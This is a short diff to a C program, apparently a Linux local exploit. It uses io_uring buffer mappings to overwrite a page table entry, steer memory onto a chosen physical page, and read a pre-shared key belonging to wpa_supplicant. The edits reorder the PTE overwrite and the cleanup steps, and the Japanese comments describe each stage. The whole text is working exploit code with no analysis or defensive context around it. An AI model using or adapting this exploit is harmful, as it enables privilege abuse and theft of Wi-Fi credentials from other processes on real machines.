@@ -4,7 +4,6 @@
 #include <string.h>
 #include <stdio.h>
 #include <ctype.h>
-#include <sys/mman.h>
 #include <liburing.h>
 #include <stdlib.h>
 
@@ -83,8 +82,8 @@ int main() {
     printf("[+] at %p: %lx\n", pbuf_map, *(uint64_t *)pbuf_map);
     printf("[+] at %p: %lx\n", (uint64_t *)pbuf_map + 1, *((uint64_t *)pbuf_map + 1));
 
-    // PTE 書き換え
-    *(uint64_t *)pbuf_map = *((uint64_t *)pbuf_map + 1);
+    // new_map_3 の pfn を保存
+    uint64_t new_map_3_pfn = *((uint64_t *)pbuf_map + 1);
 
     // ダミーページ確保
     address dummy_pages[DUMMY_PAGE];
@@ -143,6 +142,9 @@ int main() {
 
     // 誘導に成功したか確認
     if (target_page.phys_addr == phys_addr) {
+        // PTE 書き換え
+        *(uint64_t *)pbuf_map = new_map_3_pfn;
+
         printf("[+] successfully lead to the target page\n");
         uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
         for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
@@ -154,10 +156,10 @@ int main() {
     }
 
     // 後処理
-    kill_wpa_supplicant();
     munmap(new_map_1, 0x1000);
-    munmap(new_map_2, 0x1000);
-    munmap(pbuf_map, 0x1000);
+    // munmap(pbuf_map, 0x1000);
+    kill_wpa_supplicant();
+    // munmap(new_map_2, 0x1000);
     io_uring_queue_exit(&ring);
 
     return 0;
